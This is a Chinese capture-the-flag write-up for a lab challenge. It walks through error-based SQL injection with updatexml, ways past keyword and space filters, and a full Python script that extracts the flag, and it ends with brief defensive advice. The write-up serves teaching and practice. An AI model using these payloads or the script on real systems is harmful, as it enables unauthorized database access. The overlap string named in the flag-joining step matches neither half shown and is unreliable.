# Writeup 4 [极客大挑战 2019] HardSQL



## 一、题目信息

- **题目名称**：HardSQL  
- **题目来源**：极客大挑战 2019  
- **题目类型**：Web / SQL 注入（报错注入）  
- **靶机地址**：`http://351f02e6-4c72-4e88-95ab-89d5a21d066f.node5.buuoj.cn:81/`  
- **目标**：通过 SQL 注入获取数据库中存储的 flag

---

## 二、页面分析

访问靶机地址，呈现一个登录表单：

- 提交方式：`GET`
- 参数：`username` 和 `password`
- 提交地址：`check.php`

页面提示：

```
没错，又是我，这群该死的黑客竟然如此厉害，所以我回去爆肝SQL注入，这次，再也没有人能拿到我的flag了！
```

说明开发者加强了过滤，但依然可能存在注入漏洞。

---

## 三、寻找注入点

### 测试 payload

在 `password` 参数后加单引号：

```http
http://351f02e6-4c72-4e88-95ab-89d5a21d066f.node5.buuoj.cn:81/check.php?username=admin&password=123'
```

返回错误信息：

```
Error!

You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''123''' at line 1
```

说明 `password` 参数存在 SQL 注入，且数据库为 **MariaDB**（语法与 MySQL 兼容）。

---

## 四、过滤规则探测与绕过

### 4.1 测试常见关键字

尝试 `and 1=1`、`or 1=1`、`&&`、`||` 等，均返回：

```
你可别被我逮住了，臭弟弟
```

说明过滤了：

- 逻辑运算符：`and`、`or`、`&&`、`||`
- 比较符号：`=`（等号）
- 空格
- 部分函数：`substr`、`substring`、`mid` 等

### 4.2 绕过方法汇总

| 被过滤                           | 绕过方式                  | 示例                                        |
| -------------------------------- | ------------------------- | ------------------------------------------- |
| `and` / `or`                     | 与函数结合并用括号包裹    | `or(updatexml(...))`                        |
| `=`                              | 用 `like` 代替            | `where(table_schema)like(database())`       |
| 空格                             | 用括号 `()` 包裹子查询    | `select(group_concat(table_name))from(...)` |
| `substr` / `substring` / `mid`   | 用 `left` 或 `right` 代替 | `left(password,30)`、`right(password,30)`   |
| `updatexml` 输出截断（约32字符） | 分段读取 + 智能拼接       | `left` + `right` 组合                       |

**关键点**：

虽然 `or` 单独出现可能被拦，但与函数结合并用括号包裹时可以绕过。本题最终可用 payload 为：

```sql
or(updatexml(1,concat(0x7e,(子查询),0x7e),1))or'
```

---

## 五、核心函数详解

### 5.1 `updatexml()` —— 报错注入核心函数

#### 语法

```sql
UPDATEXML(xml_target, xpath_expr, new_value)
```

#### 参数说明

- **`xml_target`**：要操作的 XML 字符串（通常给一个非空值，如 `1`）。
- **`xpath_expr`**：XPath 表达式，指定要更新的位置。
- **`new_value`**：新值。

#### 报错原理

当 `xpath_expr` 不是合法的 XPath 语法时，MySQL/MariaDB 会抛出错误，并将表达式中的内容显示在错误信息中。

#### 示例

```sql
SELECT UPDATEXML(1, '~', 1);
```

错误信息：

```
XPATH syntax error: '~'
```

利用这个特性，可以将 SQL 查询结果拼接到 `xpath_expr` 中，从而在报错中“带出”数据。

#### 本题利用

```sql
updatexml(1, concat(0x7e, (子查询), 0x7e), 1)
```

- `0x7e` 是 `~` 的十六进制，作为分隔符，便于阅读。
- 子查询可以是 `select database()`、`select left(password,30)` 等。

---

### 5.2 `concat()` —— 字符串拼接

#### 语法

```sql
CONCAT(str1, str2, ...)
```

#### 示例

```sql
SELECT CONCAT('a', 'b', 'c');   -- 返回 'abc'
SELECT CONCAT(0x7e, 'hello');   -- 返回 '~hello'
```

---

### 5.3 `like` —— 替代等号

#### 语法

```sql
expr LIKE pattern
```

#### 替代等号

当 `=` 被过滤时，用 `like` 进行相等判断：

```sql
-- 原语句
WHERE table_schema = database()

-- 绕过后
WHERE table_schema LIKE database()
```

---

### 5.4 `group_concat()` —— 多行合并为单字符串

#### 语法

```sql
GROUP_CONCAT(column [ORDER BY ...] [SEPARATOR '分隔符'])
```

#### 示例

```sql
SELECT GROUP_CONCAT(table_name) FROM information_schema.tables;
-- 返回：'users,products,orders'
```

在报错注入中，`group_concat()` 可以把多个表名、列名或数据值合并成一条，一次性带出。

---

### 5.5 `left()` 和 `right()` —— 截取字符串左侧/右侧部分

#### 语法

```sql
LEFT(str, length)
RIGHT(str, length)
```

#### 示例

```sql
SELECT LEFT('flag{123456}', 4);   -- 返回 'flag'
SELECT RIGHT('flag{123456}', 6);  -- 返回 '123456}'
```

#### 本题应用

由于 `updatexml()` 只显示约 32 字符，而 flag 长度为 42 字符，因此：

- 用 `left(password,30)` 读取前半段
- 用 `right(password,30)` 读取后半段
- 然后智能拼接得到完整 flag

---

### 5.6 括号 `()` —— 替代空格

在 SQL 中，括号可以包裹子查询或表达式，从而避免使用空格。

#### 示例

| 原语句（含空格）      | 绕过（用括号）         |
| --------------------- | ---------------------- |
| `select * from users` | `select(*)from(users)` |
| `where id = 1`        | `where(id)=1`          |
| `and 1=1`             | `and(1=1)`             |

#### 本题应用

```sql
select(left(password,30))from(H4rDsq1)
```

---

## 六、完整攻击步骤

### 6.1 确认注入点与可用函数

访问：

```http
http://351f02e6-4c72-4e88-95ab-89d5a21d066f.node5.buuoj.cn:81/check.php?username=1&password=1'or(updatexml(1,concat(0x7e,database(),0x7e),1))or'1
```

返回：

```
Error!

XPATH syntax error: '~geek~'
```

- 确认注入点：`password`
- 确认可用函数：`updatexml()`、`concat()`
- 获得数据库名：`geek`

---

### 6.2 获取表名

Payload：

```sql
or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))or'1
```

URL：

```
http://351f02e6-4c72-4e88-95ab-89d5a21d066f.node5.buuoj.cn:81/check.php?username=1&password=1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))or'1
```

返回：

```
Error!

XPATH syntax error: '~H4rDsq1~'
```

- 表名：`H4rDsq1`

---

### 6.3 获取字段名

Payload：

```sql
or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))or'1
```

URL：

```
http://351f02e6-4c72-4e88-95ab-89d5a21d066f.node5.buuoj.cn:81/check.php?username=1&password=1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))or'1
```

返回：

```
Error!

XPATH syntax error: '~id,username,password~'
```

- 字段名：`id`、`username`、`password`
- flag 应该在 `password` 字段中

---

### 6.4 获取前半段 flag（使用 `left`）

Payload：

```sql
or(updatexml(1,concat(0x7e,(select(left(password,30))from(H4rDsq1)),0x7e),1))or'1
```

URL：

```
http://351f02e6-4c72-4e88-95ab-89d5a21d066f.node5.buuoj.cn:81/check.php?username=1&password=1'or(updatexml(1,concat(0x7e,(select(left(password,30))from(H4rDsq1)),0x7e),1))or'1
```

返回：

```
Error!

XPATH syntax error: '~flag{5705cce6-872d-4315-bccf-4~'
```

- 前半段 flag：`flag{5705cce6-872d-4315-bccf-4`

---

### 6.5 获取后半段 flag（使用 `right`）

Payload：

```sql
or(updatexml(1,concat(0x7e,(select(right(password,30))from(H4rDsq1)),0x7e),1))or'1
```

URL：

```
http://351f02e6-4c72-4e88-95ab-89d5a21d066f.node5.buuoj.cn:81/check.php?username=1&password=1'or(updatexml(1,concat(0x7e,(select(right(password,30))from(H4rDsq1)),0x7e),1))or'1
```

返回：

```
Error!

XPATH syntax error: '~6-872d-4315-bccf-45a5f4696289}~'
```

- 后半段 flag：`6-872d-4315-bccf-45a5f4696289}`

---

### 6.6 智能拼接完整 flag

观察两部分，后半段开头 `e-f78e-4d0a-9b6f-9f` 与前半段末尾重叠。

**拼接算法**：

1. 找到前半段的后缀与后半段的前缀的最长重叠（在保证flag长度的前提下）
2. 去掉后半段的重叠部分，然后拼接

```python
left_part = "flag{5705cce6-872d-4315-bccf-4"
right_part = "6-872d-4315-bccf-45a5f4696289}"

overlap = 0
for i in range(1, min(len(left_part), len(right_part))):
    if left_part[-i:] == right_part[:i]:
        overlap = i

full_flag = left_part + right_part[overlap:]
print(full_flag)  # flag{5705cce6-872d-4315-bccf-45a5f4696289}
```

**最终 flag**：

```
flag{5705cce6-872d-4315-bccf-45a5f4696289}
```

---

## 七、完整的攻击脚本（Python）

```python
import requests
import re

url = "http://351f02e6-4c72-4e88-95ab-89d5a21d066f.node5.buuoj.cn:81/check.php"
headers = {"User-Agent": "Mozilla/5.0"}

def extract_error(html):
    match = re.search(r"XPATH syntax error: '~([^~]+)~'", html)
    return match.group(1) if match else None

# 1. 获取数据库名
payload_db = "1'or(updatexml(1,concat(0x7e,database(),0x7e),1))or'1"
r_db = requests.get(url, params={"username": "1", "password": payload_db}, headers=headers)
print("Database:", extract_error(r_db.text))

# 2. 获取表名
payload_table = "1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))or'1"
r_table = requests.get(url, params={"username": "1", "password": payload_table}, headers=headers)
print("Tables:", extract_error(r_table.text))

# 3. 获取字段名
payload_column = "1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))or'1"
r_column = requests.get(url, params={"username": "1", "password": payload_column}, headers=headers)
print("Columns:", extract_error(r_column.text))

# 4. 获取前半段 flag（left）
payload_left = "1'or(updatexml(1,concat(0x7e,(select(left(password,30))from(H4rDsq1)),0x7e),1))or'1"
r_left = requests.get(url, params={"username": "1", "password": payload_left}, headers=headers)
left_part = extract_error(r_left.text)
print("Left(30):", left_part)

# 5. 获取后半段 flag（right）
payload_right = "1'or(updatexml(1,concat(0x7e,(select(right(password,30))from(H4rDsq1)),0x7e),1))or'1"
r_right = requests.get(url, params={"username": "1", "password": payload_right}, headers=headers)
right_part = extract_error(r_right.text)
print("Right(30):", right_part)

# 6. 智能拼接
if left_part and right_part:
    overlap = 0
    for i in range(1, min(len(left_part), len(right_part))):
        if left_part[-i:] == right_part[:i]:
            overlap = i
    full_flag = left_part + right_part[overlap:] if overlap else left_part + right_part
    print(f"完整 Flag: {full_flag}")
```

**运行结果示例**：

```python
Database: geek
Tables: H4rDsq1
Columns: id,username,password
Left(30): flag{5705cce6-872d-4315-bccf-4
Right(30): 6-872d-4315-bccf-45a5f4696289}
完整 Flag: flag{5705cce6-872d-4315-bccf-45a5f4696289}

进程已结束，退出代码为 0
```

---

## 八、总结与扩展

### 8.1 核心考点

**a. 报错注入**：利用 `updatexml()` 函数的 XPath 语法错误带出数据。

**b. 绕过过滤**：

- `=` → `like`
- 空格 → `()`
- `and` → 改用 `or` + 括号
- `substr`/`substring`/`mid` → 用 `left` / `right` 代替

**c. 数据截断处理**：`updatexml()` 只显示约 32 字符，用 `left` + `right` 分段读取并智能拼接。

### 8.2 常见报错注入函数对比

| 函数             | 报错长度限制           | 是否常用 |
| ---------------- | ---------------------- | -------- |
| `updatexml()`    | 约 32 字符             | ✅ 常用   |
| `extractvalue()` | 约 32 字符             | ✅ 常用   |
| `floor()`        | 无限制但易报重复键错误 | ⚠️ 较老   |

### 8.3 防御措施

- 使用参数化查询（Prepared Statements）
- 严格过滤危险函数名（如 `updatexml`、`extractvalue`、`left`、`right`）
- 禁用错误回显，使用自定义错误页面

---

**最终 Flag**：

```
flag{5705cce6-872d-4315-bccf-45a5f4696289}
```
